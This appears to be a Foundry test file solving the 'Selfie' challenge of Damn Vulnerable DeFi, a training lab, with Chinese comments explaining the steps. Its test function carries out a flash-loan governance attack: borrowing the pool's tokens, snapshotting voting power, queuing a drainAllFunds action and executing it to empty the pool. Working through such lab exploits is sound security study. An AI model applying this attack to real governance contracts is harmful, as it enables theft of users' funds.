// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool( // 提供dvt币的flashloan同时又用dvt开展治理,6
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploitSELFIE() public {
        // exploit过程: 1.闪电贷dvt币 2.让dvt快照
        // 3.还闪电贷 然后去gov提出提案(关键在data的构造,调用池子的drainAllFunds函数将所有币打给attacker)
        // 4. 快进区块时间 5. 执行提案

        ReceiveFlashLoan rf=new ReceiveFlashLoan();
        vm.etch(attacker,address(rf).code);
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        selfiePool.flashLoan(TOKENS_IN_POOL);

        bytes memory data=abi.encodeWithSignature("drainAllFunds(address)",attacker);
        uint256 id=simpleGovernance.queueAction(address(selfiePool),data,0);
        vm.warp(block.timestamp+ 2 days);
        simpleGovernance.executeAction(id);
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

// 需要用到外面地址的情况就写成这样 直接在函数里初始化
contract ReceiveFlashLoan is Test{
    function receiveTokens(address dvtAddress,uint256 amount) public payable {
        DamnValuableTokenSnapshot dvt = DamnValuableTokenSnapshot(0x185a4dc360CE69bDCceE33b3784B0282f7961aea);
        SimpleGovernance gov = SimpleGovernance(0xEFc56627233b02eA95bAE7e19F648d7DcD5Bb132);
        address attacker = 0x9aF2E2B7e57c1CD7C68C5C3796d8ea67e0018dB7;
        dvt.snapshot();
        dvt.transfer(msg.sender,1_500_000 ether);
    }
}
